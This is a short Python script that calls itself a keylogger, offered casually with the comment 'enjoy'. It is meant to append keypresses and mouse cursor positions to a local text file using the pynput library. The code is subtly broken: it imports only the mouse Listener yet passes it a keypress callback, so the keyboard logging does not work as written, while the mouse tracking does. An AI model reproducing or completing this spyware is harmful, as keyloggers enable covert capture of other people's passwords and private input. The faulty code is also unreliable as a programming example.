from pynput.mouse import Listener
# This is an instance keylogger getting keypress and appending them to a text file
# enjoy
def writefile(key):
    keydata = str(key)
    with open('file.txt', 'a') as file:
        file.write(keydata)

def keyboardlistener():
    with Listener(on_press=writefile) as l:
        l.join()

# MOUSE listener
def getposition(x,y):
    print(f'Position is : ({x}, {y})')
    with open('file.txt', 'a') as file:
        file.write(f'Position is : ({x}, {y})\n')

def mouselistener():
    with Listener(on_move=getposition) as l:
        l.join()

keyboardlistener()
